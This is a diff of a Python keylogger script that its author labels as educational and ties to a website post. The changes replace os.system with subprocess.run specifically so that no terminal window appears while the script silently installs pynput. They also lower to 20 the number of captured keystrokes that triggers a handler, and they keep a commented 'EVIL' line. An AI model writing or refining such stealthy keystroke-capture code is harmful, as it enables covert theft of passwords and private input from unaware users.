@@ -1,18 +1,22 @@
 """
-    
     This code is for Education purposes only and I don't have any responsibilities for the way of using it.
     and made for a post on my website.
     https://letscode.erfanpaslar.ir/post.php?pId=18
 """
 
-from os import system
+import subprocess
+# from os import system
 # if you did the EVIL😈 part uncomment the next line
-# system("explorer /root,") 
+# subprocess.run("explorer /root,", capture_output=True)
+
+# # system("explorer /root,") #if you use system() the terminal window will be open but with 'subprocess' it won't.
+
 try:
     from pynput import keyboard
 except ModuleNotFoundError:
     # print("I'm installing pynput library XD")
-    system("pip install pynput")
+    precess = subprocess.run("pip install pynput", capture_output=True)# the user must connect to internet do to installation
+    # system("pip install pynput") #if you use system() the terminal window will be open but with 'subprocess' it won't.
     # print("I'v installed it :)")
     from pynput import keyboard
 
@@ -73,7 +77,7 @@ def onPress(key):
     global keysString, count
     count += 1
     keysString += "{}+,".format(key)
-    if count > 200:# this is the number of keys that pressed or released, and the string length is abut 200*5 = 1000 chars BUT the ideal number is about 2000
+    if count > 20:# this is the number of keys that pressed or released, and the string length is abut 200*5 = 1000 chars BUT the ideal number is about 2000
         doSomthingWithKeys()
     # print("Key {} pressed.".format(key))
 
